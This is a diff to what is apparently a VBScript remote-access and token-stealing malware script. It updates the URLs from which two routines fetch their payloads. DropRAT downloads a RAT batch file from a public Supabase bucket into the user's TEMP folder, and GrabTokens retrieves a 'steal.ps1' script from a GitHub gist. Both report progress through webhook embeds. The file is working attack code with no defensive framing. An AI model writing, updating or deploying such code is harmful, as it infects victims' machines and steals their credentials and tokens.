@@ -149,7 +149,7 @@ End Sub
 ' --- DropRAT ---
 Sub DropRAT()
     Call PostEmbed(":package: RAT Download", "Fetching Payload...", 3447003)
-    Dim dl : dl = "https://aqkqhdfafepmmsccxpyf.supabase.co/storage/v1/object/public/godspla/client-12.bat"
+    Dim dl : dl = "https://aqkqhdfafepmmsccxpyf.supabase.co/storage/v1/object/public/godspla/client-17.bat"
     
     Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\agent.bat"
     If fso.FileExists(op) Then fso.DeleteFile op
@@ -218,7 +218,7 @@ End Sub
 Sub GrabTokens()
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    xh.Open "GET", "https://gist.githubusercontent.com/vizeynDev/1ac4a11405f73febbb261f0a0f391314/raw/ff3015d90e971b563bc4714a449a134bffb7c2f3/steal.ps1", False
+    xh.Open "GET", "https://gist.githubusercontent.com/vizeynDev/1ac4a11405f73febbb261f0a0f391314/raw/steal.ps1", False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
     Dim pc: pc = xh.responseText
